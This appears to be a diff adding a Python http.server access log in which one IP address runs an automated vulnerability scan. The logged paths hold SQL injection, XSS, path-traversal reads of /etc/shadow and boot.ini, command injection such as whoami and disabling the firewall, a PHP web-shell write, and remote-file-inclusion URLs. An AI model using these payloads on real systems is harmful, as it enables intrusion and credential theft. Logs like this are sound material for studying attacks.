@@ -1,0 +1,1131 @@
+185.238.32.132 - - [24/Feb/2021 17:22:30] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:30] "GET /5100%200600%200000%200002%0923%2F2031 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:30] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:30] "GET /%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fhosts%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:31] "GET /%2B74951885824 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:31] "GET /%20ORDER%20BY%2018%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:32] "GET /%2B74950097648 HTTP/1.1" 404 -
+----------------------------------------
+Exception happened during processing of request from ('185.238.32.132', 51932)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 320, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 351, in process_request
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/lib/python3.6/http/server.py", line 418, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.6/http/server.py", line 406, in handle_one_request
+    method()
+  File "/usr/lib/python3.6/http/server.py", line 636, in do_GET
+    f = self.send_head()
+  File "/usr/lib/python3.6/http/server.py", line 662, in send_head
+    if os.path.isdir(path):
+  File "/usr/lib/python3.6/genericpath.py", line 42, in isdir
+    st = os.stat(s)
+UnicodeEncodeError: 'ascii' codec can't encode character '\u202d' in position 6: ordinal not in range(128)
+----------------------------------------
+185.238.32.132 - - [24/Feb/2021 17:22:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:32] "GET /%20ORDER%20BY%201%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:33] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:33] "GET /%3Cscript%3Ealert(1)%3C!--INJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:33] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:33] "GET /%20OR%20x%3Dx%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:34] "GET /%2B74951209397 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:34] "GET /%2F..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%2Fhosts%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:34] "GET /%2B7%20495%20120%203035 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:35] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:35] "GET /%3Cscript%3Ealert(1)%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:35] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:35] "GET /8%20906%20166%2039%2035 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:36] "GET /%20RLIKE%20(SELECT%20(CASE%20WHEN%20(4346%3D4347)%20THEN%200x61646d696e%20ELSE%200x28%20END))%20AND%20'Txws'%3D' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:36] "GET /%20and%20(select%20substring(%40%40version%2C1%2C1))%3D'M' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:36] "GET /kek.tgz HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:37] "GET /%2B7%20927378675 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:37] "GET /5105105105105100 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:38] "GET /%3Csvg%2Fonload%3Dalert(%60INJECTX%60)%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:38] "GET /4300000000000777 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:38] "GET /alert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+----------------------------------------
+Exception happened during processing of request from ('185.238.32.132', 51951)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 320, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 351, in process_request
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/lib/python3.6/http/server.py", line 418, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.6/http/server.py", line 406, in handle_one_request
+    method()
+  File "/usr/lib/python3.6/http/server.py", line 636, in do_GET
+    f = self.send_head()
+  File "/usr/lib/python3.6/http/server.py", line 662, in send_head
+    if os.path.isdir(path):
+  File "/usr/lib/python3.6/genericpath.py", line 42, in isdir
+    st = os.stat(s)
+UnicodeEncodeError: 'ascii' codec can't encode character '\u202d' in position 6: ordinal not in range(128)
+----------------------------------------
+185.238.32.132 - - [24/Feb/2021 17:22:39] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:39] "GET /%20ORDER%20BY%204%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:40] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:40] "GET /%20OR%201%3D0 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:40] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:40] "GET /%3Ca%20href%3D%22javascript%3Aalert(1)%22%20onmouseover%3Dalert(1)%3EINJECTX%20HOVER%3C%2Fa%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:41] "GET /%20AND%207300%3D7300%20AND%20('pKlZ'%3D'pKlZ HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:41] "GET /%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Aalert(1)%22%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:41] "GET /%20WHERE%201%3D1%20AND%201%3D1-- HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:42] "GET /%2B79052184956 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:42] "GET /%2Fproc%2F%5B0-9%5D*%2Ffd%2F%5B0-9%5D*%20%20%20(first%20number%20is%20the%20PID%2C%20second%20is%20the%20filedescriptor) HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:43] "GET /%3Csvg%2Fonload%3Dalert%60INJECTX%60%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:43] "GET /%2F..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%2Fhosts HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:43] "GET /%26%20uname%20-a HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:44] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:44] "GET /%20ORDER%20BY%2016--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:44] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:44] "GET /%3Cmarguee%2Fonstart%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:45] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:45] "GET /%20and%20(select%20substring(%40%40version%2C3%2C1))%3D'X' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:45] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:45] "GET /%20OR%201%3D0%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:45] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:45] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:46] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:46] "GET /%26%26%20type%20%25SYSTEMROOT%25%5Crepair%5CSYSTEM HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:46] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:46] "GET /8%20905%20210%2041%2073 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:47] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:47] "GET /%2B7-911-237-98-14 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:47] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:47] "GET /%2F%2Fxerosecurity.com%2F.testing%2Frfi_vuln.php%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:47] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:47] "GET /%20ORDER%20BY%2013--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:48] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:48] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Chosts%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:48] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:48] "GET /%20ORDER%20BY%2028%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:49] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:49] "GET /%2F..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:49] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:49] "GET /%2F..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%2Fshadow%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:49] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:49] "GET /%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:50] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:50] "GET /%7C%20ls%20-laR%20%2Fetc HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:50] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:50] "GET /%2F..........................................................................%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%2Fpasswd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:51] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:51] "GET /%3B%20ls%20-laR%20%2Fvar%2Fwww HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:51] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:51] "GET /%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fshadow HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:51] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:51] "GET /%2Fetc%2Fhosts HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:52] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:52] "GET /8%20969%20765%2090%2060 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:52] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:52] "GET /%2B7%209030305906 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:52] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:52] "GET /%7Dalert(%2FINJECTX%2F)%3B%7B%2F%2F HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:53] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:53] "GET /IF(7423%3D7424)%20SELECT%207423%20ELSE%20DROP%20FUNCTION%20xcjl-- HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:53] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:53] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:54] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:54] "GET /%20ORDER%20BY%2023%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:54] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:54] "GET /6771%207980%202500%200004%0933%2F2077 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:54] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:54] "GET /%20and%20(select%20substring(%40%40version%2C2%2C1))%3D'y' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:55] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:55] "GET /%20ORDER%20BY%205%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:55] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:55] "GET /%20ORDER%20BY%2010%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:56] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:56] "GET /%26%26%20perl%20-e%20'print%20%22X%22x2048' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:56] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:56] "GET /%2B7%20499%20350-69-31 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:56] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:56] "GET /%3Cimg%20src%3Dx%20onerror%3Dprompt(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:57] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:22:57] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:57] "GET /%2B79650878527 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:57] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:57] "GET /%3Cimg%20onload%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:58] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:58] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:58] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:58] "GET /%20OR%20x%3Dy HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:59] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:59] "GET /%2B7-981-960-12-14 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:59] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:59] "GET /%20HAVING%201%3D0 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:22:59] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:22:59] "GET /%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fboot.ini HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:00] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:00] "GET /%20ORDER%20BY%2011--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:00] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:00] "GET /%2B%20912%20099%2002%2017 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:01] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:01] "GET /%3Cimg%20src%3Dx%20onload%3Dprompt(1)%20onerror%3Dalert(1)%20onmouseover%3Dprompt(1)%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:01] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:01] "GET /%20ORDER%20BY%2031337%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:01] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:01] "GET /%20ORDER%20BY%2027%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:02] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:02] "GET /%26%20ls%20-l%20%2F HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:02] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:02] "GET /%20ORDER%20BY%201%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:02] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:02] "GET /lalal.aspx HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:03] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:03] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:03] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:03] "GET /%26%26%20type%20C%3A%5CWINNT%5Crepair%5CSAM HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:04] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:04] "GET /%2B7%204999561978 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:04] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:04] "GET /%26%20ls%20-l%20%2Fetc%2F HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:04] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:04] "GET /8%20499%20672%2000%2056 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:05] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:05] "GET /%20OR%201%3D1%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:05] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:05] "GET /rar.zip HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:06] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:06] "GET /5500%200000%200000%200004%0900%2F2030 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:06] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:06] "GET /%20ORDER%20BY%2020--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:06] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:06] "GET /%20ORDER%20BY%207%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:07] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:07] "GET /%2B79259695158 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:07] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:07] "GET /%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:08] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:08] "GET /%2B37037214033 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:08] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:08] "GET /%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:08] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:08] "GET /%20ORDER%20BY%208%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:09] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:09] "GET /%2B37037214030 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:09] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:09] "GET /%26%26%20dir%20C%3A%5CDocuments%20and%20Settings%5C* HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:09] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:09] "GET /%20ORDER%20BY%2030%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:10] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:10] "GET /5103%202219%201119%209245%0973%2F2030 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:10] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:10] "GET /%2B7%20343%20220-37-18 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:11] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:11] "GET /%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fetc%2Fhosts%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:11] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:11] "GET /%2Fboot.ini HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:11] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:11] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cshadow HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:12] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:12] "GET /5424%200000%200000%200015%2053%2F4881 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:12] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:12] "GET /%22%20%7C%7C%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:13] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:13] "GET /%20AND%201%3D0%20AND%20'%25'%3D' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:13] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:13] "GET /%2B79064103982 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:13] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:13] "GET /%20ORDER%20BY%208--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:14] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:14] "GET /%20ORDER%20BY%2025%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:14] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:14] "GET /%26%26%20echo%20%22%3C%3Fphp%20system('dir%20%24_GET%5B'dir'%5D')%3B%20%3F%3E%22%20%3E%20dir.php%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:14] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:14] "GET /%3Cform%3E%3Cbutton%20formaction%3D%22javascript%3Aalert(1)%22%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:15] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:15] "GET /%2B7%20969996446 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:15] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:15] "GET /%20ORDER%20BY%2023%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:16] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:16] "GET /%20ORDER%20BY%2012%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:16] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:16] "GET /4111111111111111 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:16] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:16] "GET /https%3A%2F%2Fcrowdshield.com%2F.testing%2Frfi_vuln.php%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:17] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:17] "GET /%20ORDER%20BY%206--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:17] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:17] "GET /%26%26%20netsh%20firewall%20set%20opmode%20disable HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:18] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:18] "GET /%20ORDER%20BY%2010--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:18] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:18] "GET /%20%2Fetc%2Fpasswd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:18] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:18] "GET /%26%26%20ls%20-l%20%2Fetc%2F HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:19] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:19] "GET /%26%26%20ls%20-laR%20%2Fetc HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:19] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:19] "GET /%2B74953741652 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:19] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:19] "GET /%2B484%20250%20562%20950 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:20] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:20] "GET /%20AND%201%3D1--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:20] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:20] "GET /%2B7%20925%20362-84-73 HTTP/1.1" 404 -
